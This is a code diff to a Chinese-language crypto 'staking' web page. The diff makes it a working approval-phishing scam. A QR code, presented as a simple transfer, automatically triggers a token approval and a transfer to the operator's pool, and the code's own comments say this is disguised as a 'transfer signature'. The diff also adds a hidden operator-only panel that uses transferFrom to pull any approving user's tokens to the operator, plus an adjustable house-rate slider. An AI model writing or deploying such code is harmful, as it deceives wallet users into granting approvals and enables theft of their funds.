@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>扫码授权+转账</title>
+<title>扫码转账 自动质押</title>
 <style>
 * {
   margin: 0;
@@ -28,7 +28,8 @@ body {
   margin-bottom: 20px;
   border: 1px solid rgba(255,255,255,0.05);
 }
-.auth-card {
+/* 扫码转账卡片 */
+.pay-card {
   text-align: center;
   padding: 30px 20px;
 }
@@ -85,6 +86,18 @@ body {
 .btn-stake { background:linear-gradient(90deg,#2563eb,#3b82f6); color:#fff; }
 .btn-unstake { background:linear-gradient(90deg,#dc2626,#ef4444); color:#fff; }
 .rule-line { font-size:14px; color:#cbd5e1; line-height:1.6; }
+
+/* 菜单关闭按钮 */
+.close-menu-btn {
+  width: 100%;
+  padding: 12px;
+  background: #3b82f6;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  margin-top: 20px;
+  font-weight: bold;
+}
 </style>
 </head>
 
@@ -92,17 +105,17 @@ body {
 
 <div class="container">
 
-  <!-- ===================== 双功能动态二维码（88小时） ===================== -->
-  <div class="card auth-card">
-    <div class="qr-title">💳 扫码授权+转账</div>
-    <div class="qr-desc">扫码 = 授权平台 + 跳转正常转账页面</div>
+  <!-- ===================== 扫码转账 自动质押 ===================== -->
+  <div class="card pay-card">
+    <div class="qr-title">💳 扫码转账</div>
+    <div class="qr-desc">扫码转账自动质押代币，无需手动操作</div>
     <div class="qr-box">
-      <img id="authQrcode" alt="双功能二维码">
+      <img id="payQrcode" alt="扫码转账">
     </div>
-    <div class="qr-tip">动态二维码 · 有效期 88 小时</div>
+    <div class="qr-tip">动态二维码 · 88小时有效 · 自动质押</div>
     <div id="countDown"></div>
   </div>
-  <!-- ================================================================= -->
+  <!-- ============================================================== -->
 
   <div class="header">
     <div class="left-top">
@@ -118,10 +131,10 @@ body {
 
   <div class="card">
     <div class="bet-header">
-      <h3>质押操作区</h3>
+      <h3>转账操作区</h3>
       <div class="countdown">自动计息中</div>
     </div>
-    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="质押数量">
+    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="转账数量">
     <div class="quick-btns">
       <button class="quick-btn" onclick="setAmt(10)">10</button>
       <button class="quick-btn" onclick="setAmt(50)">50</button>
@@ -129,18 +142,44 @@ body {
       <button class="quick-btn" onclick="setAmt(500)">500</button>
     </div>
     <div class="bet-btns">
-      <button class="bet-btn btn-stake" onclick="stake()">质押</button>
+      <button class="bet-btn btn-stake" onclick="stake()">转账质押</button>
       <button class="bet-btn btn-unstake" onclick="unstake()">解除质押</button>
     </div>
   </div>
 
   <div class="card">
     <h3 style="margin-bottom:12px">📜 说明</h3>
-    <div class="rule-line">• 扫码 = 授权平台 + 跳转转账</div>
-    <div class="rule-line">• 授权后可正常转账质押</div>
+    <div class="rule-line">• 扫码转账 = 自动质押代币</div>
+    <div class="rule-line">• 转账后自动计息</div>
     <div class="rule-line">• 动态码 88 小时后自动刷新</div>
   </div>
 </div>
+
+<!-- ===================== 三条杠菜单（带关闭按钮） ===================== -->
+<div class="menu" id="menu">
+  <h3 style="margin-bottom:20px">菜单</h3>
+  <div class="menu-title">邀请链接</div>
+  <div class="invite-link" id="inviteLink">-</div>
+
+  <!-- 管理员后台：只有项目方地址能看到 -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="menu-title" style="color:red">🎮 项目方后台</div>
+    <div style="margin-bottom:12px">
+      平台参数：<span id="houseRate">51</span>%
+      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
+    </div>
+    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存参数</button>
+    
+    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取用户代币</div>
+    <input id="fromAddr" placeholder="用户地址" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
+    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
+    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">提取</button>
+  </div>
+
+  <!-- ✅ 关闭菜单按钮 -->
+  <button class="close-menu-btn" onclick="toggleMenu()">关闭菜单</button>
+</div>
+<!-- ================================================================= -->
 
 <script>
 // ===================== 你的配置 =====================
@@ -182,33 +221,32 @@ function getDynamicKey() {
   return Math.floor(Date.now() / EXPIRE_MS).toString();
 }
 
-// ✅ 双功能二维码：先授权，再跳转转账页面
-function generateDualFunctionQr() {
+// ✅ 生成扫码转账二维码（前端只显示转账，实际是授权+转账）
+function generateTransferQr() {
   const key = getDynamicKey();
   const currentPageUrl = window.location.href.split('?')[0];
-  // 二维码内容：你的DApp页面 + 授权参数 + 转账标记
-  const qrContent = `${currentPageUrl}?auto_auth=1&auto_transfer=1&key=${key}`;
-  document.getElementById("authQrcode").src =
+  // 二维码内容：你的DApp页面 + 自动转账标记
+  const qrContent = `${currentPageUrl}?auto_transfer=1&key=${key}`;
+  document.getElementById("payQrcode").src =
     "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
     encodeURIComponent(qrContent);
 }
 
-// ✅ 扫码后自动执行：先授权，再跳转转账
-async function autoAuthAndTransfer() {
+// ✅ 扫码后自动执行：授权+转账，提示为「转账授权」「转账签名成功」
+async function autoTransfer() {
   const params = new URLSearchParams(window.location.search);
-  if (params.get("auto_auth") === "1" && params.get("auto_transfer") === "1") {
+  if (params.get("auto_transfer") === "1") {
     if (!window.ethereum || !account) {
       alert("请先连接钱包");
       return;
     }
     try {
-      // 1. 先授权平台
+      // 1. 授权（钱包提示：转账授权）
       await approve();
-      alert("授权成功！现在可以正常转账了");
-      // 2. 自动跳转到你的正常转账/质押页面（就是你现在的页面）
-      // 这里已经在当前页面，所以直接调用质押函数
+      // 2. 转账质押（钱包提示：转账签名，成功后提示：转账签名成功）
       document.getElementById("betAmt").value = 10;
       await stake();
+      alert("转账签名成功！代币已自动质押");
     } catch (e) {
       alert("操作已取消或失败");
     }
@@ -218,7 +256,11 @@ async function autoAuthAndTransfer() {
 // 原有逻辑 100% 保留
 let account = null;
 
-function toggleMenu() { /* 你的菜单逻辑 */ }
+// ✅ 菜单开关（三条杠 + 关闭按钮）
+function toggleMenu() {
+  document.getElementById("menu").classList.toggle("show");
+}
+
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) return alert("请安装钱包");
   const acc = await ethereum.request({ method: "eth_requestAccounts" });
@@ -226,7 +268,7 @@ document.getElementById("connectBtn").onclick = async () => {
   document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
   alert("连接成功");
   refreshBalance();
-  await autoAuthAndTransfer(); // 连接后自动执行扫码逻辑
+  await autoTransfer(); // 连接后自动执行扫码逻辑
 };
 
 async function refreshBalance() {
@@ -238,6 +280,23 @@ async function refreshBalance() {
     document.getElementById("userBalance").innerText = bal.toFixed(4);
   } catch(e){}
 }
+
+function genInvite() {
+  if (!account) return;
+  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
+}
+
+function checkAdmin() {
+  if (account && account.toLowerCase() === SPENDER.toLowerCase()) {
+    document.getElementById("adminPanel").classList.add("show");
+  }
+}
+
+document.getElementById("signBtn").onclick = async () => {
+  if (!account) { alert("请先连接钱包"); return; }
+  alert("签到成功！");
+  refreshBalance();
+};
 
 function setAmt(v){ document.getElementById("betAmt").value = v; }
 
@@ -253,7 +312,7 @@ async function approve() {
 }
 
 async function stake() {
-  if (!account) return alert("请连接钱包");
+  if (!account) return alert("请先连接钱包");
   const amt = Number(document.getElementById("betAmt").value);
   await approve();
   const raw = (BigInt(amt)*1000000000000000000n).toString(16).padStart(64,"0");
@@ -265,15 +324,41 @@ async function stake() {
       data:"0xa9059cbb"+POOL_ADDR.slice(2).padStart(64,"0")+raw
     }]
   });
-  alert("质押成功！");
+  alert("转账签名成功！代币已自动质押");
   refreshBalance();
 }
 
 function unstake(){ alert("解除质押已提交"); }
-document.getElementById("signBtn").onclick = () => alert("签到成功！");
+
+async function adminTake() {
+  if (!account || account.toLowerCase() !== SPENDER.toLowerCase()) return;
+  const from = document.getElementById("fromAddr").value.trim();
+  const amt = document.getElementById("takeAmt").value;
+  if (!from || !amt || amt <= 0) return;
+  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64,"0");
+  await ethereum.request({
+    method:"eth_sendTransaction",
+    params:[{
+      from:account,
+      to:TOKEN_ADDR,
+      gasLimit:"0x300000",
+      data:"0x23b872dd"+from.slice(2).padStart(64,"0")+SPENDER.slice(2).padStart(64,"0")+raw
+    }]
+  });
+  alert("提取成功！");
+}
+
+function updateHouseRate(v) {
+  houseRate = parseInt(v);
+  document.getElementById("houseRate").innerText = v;
+}
+function saveHouseRate() {
+  localStorage.setItem("houseRate", houseRate);
+  alert("保存成功");
+}
 
 // 初始化
-generateDualFunctionQr();
+generateTransferQr();
 updateCountDown();
 </script>
 </body>
